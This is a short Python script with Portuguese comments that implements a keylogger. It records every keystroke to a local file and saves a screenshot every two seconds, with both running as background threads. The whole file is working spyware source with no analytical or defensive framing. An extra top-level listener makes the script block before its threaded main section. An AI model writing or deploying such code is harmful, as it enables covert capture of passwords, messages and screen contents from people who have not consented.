from pynput.keyboard import Key, Listener
import threading
import time
from datetime import datetime
import os
import logging
import pyautogui

# Configuração do log de status
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    filename="logs/status.log",
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

logging.info("Script iniciado")
# Keylogger
def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Erro ao registrar tecla: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()


def start_keylogger():
    logging.info("Keylogger iniciado")
    with Listener(on_press=on_press) as listener:
        listener.join()


# Função de captura de tela
def start_screenshots():
    os.makedirs("prints", exist_ok=True)
    logging.info("Captura de tela iniciada")

    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot = pyautogui.screenshot()
        screenshot.save(f"prints/print_{timestamp}.png")
        logging.info(f"Print salvo: prints/print_{timestamp}.png")
        time.sleep(2)  # intervalo de 2 segundos entre prints

if __name__ == "__main__":
    t1 = threading.Thread(target=start_keylogger, daemon=True)
    t2 = threading.Thread(target=start_screenshots, daemon=True)
    t1.start()
    t2.start()

    logging.info("Threads iniciadas, script rodando em segundo plano")

    while True:
        time.sleep(1)